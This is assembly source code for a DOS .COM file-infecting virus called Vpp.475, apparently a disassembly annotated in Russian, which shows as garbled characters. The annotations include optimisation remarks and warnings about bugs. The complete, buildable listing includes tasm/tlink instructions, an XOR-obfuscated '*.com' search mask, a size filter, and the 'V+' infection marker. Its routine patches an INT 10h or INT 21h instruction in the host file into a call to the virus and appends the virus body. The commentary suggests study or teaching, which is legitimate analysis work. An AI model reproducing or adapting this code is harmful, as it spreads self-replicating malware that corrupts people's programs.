   ;‚¨àãá Vpp.475 ¤¨§ áá¥¬¡«¨à®¢  05.07.1999 (c) CrkV

   ;tasm vpp.asm /m
   ;tlink vpp.obj /t

   ;‚ â¥ªáâ¥ ªà®¬¥ ®á®¢ëå ª®¬¬¥â à¨¥¢ á®¤¥à¦ âáï:

   ;1) *¥ª®¬¥¤ æ¨¨ ¯® ®¯â¨¬¨§ æ¨¨ ;-)),  ç¨ îé¨¥áï á OPTI. * ¯à¨¬¥à OPTI-LEA,
   ;â.¥. íää¥ªâ¨¢¥¥ áà §ã ¯®«ãç¨âì  ¤à¥á (Lea Dx,[Bp+1Eh] íª®®¬¨â 1 ¡ ©â,
   ;¯® áà ¢¥¨î á Mov Dx,Bp, Add Dx,1Eh). Š®¥ç® ï ¯®¨¬ î, çâ® íâ®â §¢¥à¥ª
   ;¤¥¬®áâà æ¨®ë©, ® ª®£¤  ¢¨¤  ï¢ ï ¥íää¥ªâ¨¢®áâì ª®¤ , ï ¯à¥¤¯®ç¨â î
   ;ãª § âì   íâ® ;-)))

   ;2) *à¥¤ã¯à¥¦¤¥¨ï ® ¢®§¬®¦®áâ¨ ®è¨¡®ª - Warning.

   .model tiny
   .code
   .286
           Org     100h
   Vpp:

   Entry_Point:

   ;WARNING - € ¥á«¨ Bp ã¦® ¯à®£¥ ???

           Pop     Bp                      ;¯®«ãç¨âì  ¤à¥á ¢®§¢à â 
           Push    Bp                      ;§ ¯¨å ¥¬ ¥£® ¢ áâ¥ª
           PushA                           ;á®åà ¨¬ ¢á¥ à¥£¨áâàë
           Xchg    Bp,Ax                   ;Ax:=Bp

   ;WARNING - å®ç¥âáï § ¬¥â¨âì, â.ª. ¯¥à¥å®¤   ä ©« ®áãé¥áâ¢«ï¥âáï ¥
   ;áà §ã â® § ç¥¨ï à¥£¨áâà®¢, ¢ â®¬ ç¨á«¥ á¥£¬¥âëå, *… Ž**…„…‹…*› !!!
   ;Šà®¬¥ â®£® ¢®§¬®¦® ¨§¬¥¥¨¥ ä« £®¢ (-à Cld),   ¢®ááâ ®¢«¥¨¥
   ;¥ ¯à¥¤ãá¬®âà¥® :-(((

           Call    $+3
   My_Point:
           Pop     Bp                      ;Bp:=Offset My_Point
           Sub     Bp,Offset My_Point - Offset Entry_Point
           Cmp     Bp,100h                 ;ˆáå®¤¨ª ? OPTI-¬®¦® ¢ëª¨ãâì
           Jnz     @Restore_Byte

   @Ok_Restore:
           Call    Get_Mask
           Mov     Ah,4Eh                  ;FindFirst
           Mov     Cx,0FEh
           Mov     Dx,Bp                   ;OPTI-LEA
           Add     Dx,Real_Mask

   @Find_File:
           Int     21h
           Jc      @Exit                   ;*®¤å®¤ïé¨å ä ©«®¢ ¡®«ìè¥ ¥â

           Call    Check_File
           Mov     Ah,4Fh                  ;FindNext
           Jmp     @Find_File

   @Exit:
           Mov     Si,Bp                   ;OPTI-Lea
           Add     Si,Save_DTA
           Mov     Dx,[Si]
           Mov     Ah,1Ah                  ;Set DTA
           Int     21h                     ;‚®ááâ  ¢«¨¢ ¥¬ ¯à®£à ¬¬ãî DTA
           PopA                            ;‚®ááâ  ¢«¨¢ ¥¬ à¥£¨áâàë
           Xchg    Bp,Ax                   ;Ax:=Bp (‘®åà ï¥¬ Bp)
           Pop     Ax
           Cmp     Ax,00h
           Je      @Jmp_Return             ;¨áå®¤¨ª (OPTI-¥ ®¡ï§ â¥«ì®)
           Sub     Ax,03h                  ;‡ è«¨ ç¥à¥§ Call

   @Jmp_Return:
           Push    Ax
           Xchg    Bp,Ax                   ;Bp:=Ax (‚®ááâ  ¢«¨¢ ¥¬ Bp)
           Ret                             ;‚ëå®¤¨¬ ¨§ ¢¨àãá 

   @Restore_Byte:

           Sub     Ax,3
           Mov     Si,Bp                   ;OPTI-Lea
           Add     Si,Var_Word2
           Mov     [Si],Ax
           Mov     Si,Ax
           Mov     Di,Bp                   ;Opti-Lea
           Add     Di,Save_Byte
           Xchg    Si,Di
           Mov     Cx,3                    ;OPTI-¢ëª¨ãâì
           Cld
           MovSW
           MovSB
           Mov     Ah,2Fh                  ;Get DTA
           Int     21h
           Mov     Si,Bp                   ;Opti-Lea
           Add     Si,Save_DTA
           Mov     [Si],Bx                 ;‘®åà ï¥¬ DTA (Warning)

   ;‚®®¡é¥-â® âãâ ®è¨¡ª , â.ª. ¨ªâ® ¥ ¬¥è ¥â ¤ ¦¥ .COM ¯à®£à ¬¬¥ ãáâ ®¢¨âì
   ;DTA   á¥£¬¥â ®â«¨çë© ®â PSP. *®íâ®¬ã  ¤® á®åà ïâì ¨ á¥£¬¥â DTA

           Mov     Ah,1Ah                  ;Set DTA
           Mov     Dx,Bp                   ;Opti-Lea
           Add     Dx,New_DTA
           Int     21h                     ;ãáâ  ¢«¨¢ ¥¬ á¢®î DTA
           Jmp     @Ok_Restore

   ;---------------------------------------
   Check_File      Proc

           Mov     Ah,2Fh                  ;Get DTA
           Int     21h
           Xchg    Bx,Di                   ;Di:=Bx (Offset DTA)
           Mov     Ax,3D02h                ;Open File (çâ./§ ¯¨áì)
           Mov     Dx,Di                   ;Opti-Lea
           Add     Dx,1Eh                  ; ©¤¥®¥ ¨¬ï ¢ DTA
           Int     21h                     ;Warning

   ;€ ¢¤àã£ ä ©« ¥ ®âªà®¥âáï ;-))) ???

           Xchg    Bx,Ax                   ;Bx:=Ax (File Handle)
           Mov     Ax,4202h                ;LSeek file
           Mov     Cx,00h                  ;OPTI-SUB
           Mov     Dx,00h                  ;OTI-CWD
           Int     21h                     ;  ¢ëå®¤¥ Dx:Ax - à §¬¥à ä ©« 

           Cmp     Ax,0400h                ;1024
           Jle     @Not_Infected           ;ä ©« ¬ «®¢ â
           Cmp     Ax,0C350h               ;50000 (  ¯®ç¥¬ã ¥ 60000 ??? ;-))
           Jnb     @Not_Infected           ;  ¢®â íâ®â ¢¥«¨ª ;-))

   ;Warning - Dx â®¦¥ ¡ë ¥ ¬¥è «® ¯à®¢¥à¨âì.

           Mov     Si,Bp
           Add     Si,Save_Ofs
           Mov     [Si],Ax
           Sub     Ax,03h
           Xchg    Dx,Ax                   ;Dx:=Ax
           Mov     Ax,4200h
           Mov     Cx,0000h                ;OPTI-Lea
           Int     21h                     ;ãáâ  ¢«¨¢ ¥¬ ãª.   ª®¥æ ä ©«  - 3
           Mov     Ah,3Fh                  ;Read File
           Mov     Dx,Bp                   ;Opti-Lea
           Add     Dx,Var_Word
           Push    Dx
           Mov     Cx,02h
           Int     21h                     ;‘ç¨â ¥¬ 2 ¡ ©â 
           Pop     Si
           Mov     Ax,[Si]                 ;OPTI-LODSB
           Cmp     Ax,'+V'                 ;V+ - ¬¥âª  ¢¨àãá 

   ;OPTI -   § ç¥¬ 3 ¡ ©â  ¢ ª®¥æ ? (V+ â®¦¥ ªà á¨¢® ;-))

           Je      @Not_Infected           ;¢®§¬®¦® § à ¦¥

           Mov     Ax,4200h                ;Lseek File
           Xor     Cx,Cx                   ;ãáâ  ¢«¨¢ ¥¬ ãª § â¥«ì    ç «®
           Mov     Dx,Cx                   ;OPTI-Cwd
           Int     21h
           Call    Infect

   @Not_Infected:
           Mov     Ah,3Eh                  ;Close File

   Int21h  EQU     $ - Offset Entry_Point

   ;OPTI -   ¯®¡«¨¦¥ ª  ç «ã  ©â¨ ¥ áã¤ì¡  ??? ;-))

           Int     21h
           Ret
   Check_File      EndP
   ;---------------------------------------
   Infect  Proc
           PushA
           Mov     Dx,Bp
           Add     Dx,Buffer               ;OPTI-Lea
           Push    Dx
           Mov     Ah,3Fh                  ;Read File
           Mov     Cx,400h
           Push    Cx
           Int     21h                     ;‘ç¨âë¢ ¥¬ 1024 ¡ ©â 
           Pop     Cx
           Mov     Si,Bp                   ;OPTI-Lea
           Add     Si,Int10h
           Pop     Di
           Push    Bx
           Mov     Bx,02h                  ;OPTI-Mov Bl,2
           Call    Scan                    ;*à®¢¥àï¥¬  «¨ç¨¥ á«®¢  10CDh (Int 10h)
           Pop     Bx

   ;       Cmp     Di,0FFFFh               ;OPTI-Inc Di
           Cmp     Di,1234h                ;Tasm âãâ  ®¯â¨¬¨§¨àã¥â ;-))
           Org     $ - 2                   ;¤«ï á®¢¬¥áâ¨¬®áâ¨ ª®¤ 
           dw      0FFFFh

           Je      @Scan_CD21h             ;¥  è«¨ ¯®¨é¥¬ 21CDh
           Sub     Di,Buffer
           Sub     Di,Bp
           Call    Cont_Infect             ;*®¥¤¥¬ § à ¦ âì

   @Exit_Infect:
           PopA
           Ret

   @Scan_CD21h:
           Mov     Di,Bp                   ;OPTI-Lea
           Add     Di,Buffer
           Mov     Si,Bp
           Add     Si,Int21h               ;OPTI-Lea
           Push    Bx
           Mov     Bx,02h                  ;OPTI-Mov Bl,02h
           Call    Scan
           Pop     Bx

   ;       Cmp     Di,0FFFFh               ;OPTI-Inc Di
           Cmp     Di,1234h                ;Tasm âãâ  ®¯â¨¬¨§¨àã¥â ;-))
           Org     $ - 2                   ;¤«ï á®¢¬¥áâ¨¬®áâ¨ ª®¤ 
           dw      0FFFFh

           Je      @Exit_Infect            ;’ãâ ¥â ¨ 21CDh, ¯à¨¤¥âáï ®â¢ «¨âì
           Sub     Di,Buffer
           Sub     Di,Bp
           Call    Cont_Infect             ;*®¥¤¥¬ § à ¦ âì
           Jmp     @Exit_Infect

   ;OPTI - ¨ ¢®®¡é¥ íâ®â ªãá®ª ¨¤¥â¨ç¥ ¯®¨áªã 10CDh

   Infect  EndP
   ;---------------------------------------

   Int10h  EQU     $ - Offset Entry_Point
           Int     10h
   ;---------------------------------------
   Cont_Infect     Proc
           Mov     Ax,4200h                ;Lseek File
           Sub     Cx,Cx
           Mov     Dx,Di                   ;âãâ ¡ã¤¥â ¯¥à¥å®¤   â¥«® ¢¨àãá 
           Int     21h
           Mov     Si,Bp                   ;OPTI-Lea
           Add     Si,Save_Ofs
           Mov     Ax,[Si]
           Sub     Ax,Di
           Sub     Ax,3                    ;¢ëç¨á«ï¥¬ á¬¥é¥¨¥ ¤«ï Call ¢¨àãá
           Mov     Si,Bp                   ;OPTI-Lea
           Add     Si,Save_Byte
           Mov     Byte Ptr [Si],0E8h      ;Call Entry_Point
           Mov     [Si+01h],Ax
           Xchg    Si,Dx                   ;Dx:=Si
           Mov     Ah,40h                  ;Write File
           Mov     Cx,03h
           Int     21h                     ;‡ ¯¨á «¨ ª®¬ ¤ã ¯¥à¥å®¤ 
           Mov     Ax,4202h                ;Lseek File
           Sub     Dx,Dx                   ;Opti-Cwd
           Mov     Cx,Dx
           Int     21h                     ;ãè«¨   ª®¥æ ä ©« 
           Mov     Si,Bp                   ;Opti Lea
           Add     Si,Buffer
           Add     Si,Di
           Mov     Di,Bp                   ;OPTI-Lea
           Add     Di,Save_Byte
           Mov     Cx,03h                  ;OPTI-«ãçè¥ MovSW, MovSB
           Rep     MovSB
           Mov     Dx,Bp
           Mov     Cx,Vir_Lenght
           Mov     Ah,40h                  ;Write_File
           Int     21h                     ;„®¯¨á «¨ ¢¨àãá
           Ret
   Cont_Infect     EndP
   ;---------------------------------------
   Scan    Proc
           Push    Ax
           Push    Bx
           Push    Cx
           Push    Dx
           Cld
           Mov     Al,[Si]                 ;0CDh

   @Next_Scan:
           Repne   ScaSB
           Jz      @Ok_Scan
           Mov     Di,0FFFFh
           Jmp     @Exit_Scan

   @Ok_Scan:
           Push    Cx
           Push    Di
           Push    Si
           Mov     Cx,Bx
           Dec     Di
           Rep     CmpSB
           Je      @Find_Scan
           Pop     Si
           Pop     Di
           Pop     Cx
           Jmp     @Next_Scan

   @Find_Scan:
           Pop     Si
           Pop     Di
           Dec     Di
           Pop     Cx

   @Exit_Scan:
           Pop     Dx
           Pop     Cx
           Pop     Bx
           Pop     Ax
           Ret
   Scan    EndP
   ;---------------------------------------
   Get_Mask        Proc
           PushA
           Mov     Si,Bp                   ;OPTI-Lea
           Add     Si,Mask_Com
           Mov     Di,Bp                   ;OPTI-Lea
           Add     Di,Real_Mask
           Mov     Cx,02h
   @Next:  LodSB
           Xor     Al,'V'
           StoSB
           LodSB                           ;OPTI-LodSW ...
           Xor     Al,'+'
           StoSB
           LodSB
           Xor     Al,'+'
           StoSB
           Loop    @Next
           PopA
           Ret
   Get_Mask        EndP
   ;---------------------------------------
   Mask_Com        EQU     $ - Offset Entry_Point

           db      '*' Xor 'V'
           db      '.' Xor '+'
           db      'c' Xor '+'
           db      'o' Xor 'V'
           db      'm' Xor '+'
           db      00h Xor '+'

   Save_Ofs        EQU     $ - Offset Entry_Point
           dw      ?
   Save_Dta        EQU     $ - Offset Entry_Point
           dw      ?
   Save_Byte       EQU     $ - Offset Entry_Point
           db      3       Dup (?)
   Var_Word        EQU     $ - Offset Entry_Point
           dw      ?
   StrVpp  db      'V++'

   Vir_Lenght      EQU     $ - Offset Entry_Point  ;1DBh
   ;---------------------------------------
   Var_Word2       EQU     $ - Offset Entry_Point
           dw      ?
   Real_Mask       EQU     $ - Offset Entry_Point
           db      12h     Dup (?)
   New_DTA         EQU     $ - Offset Entry_Point

   Buffer  EQU     Vir_Lenght + 100h
   ;---------------------------------------
           End     Vpp
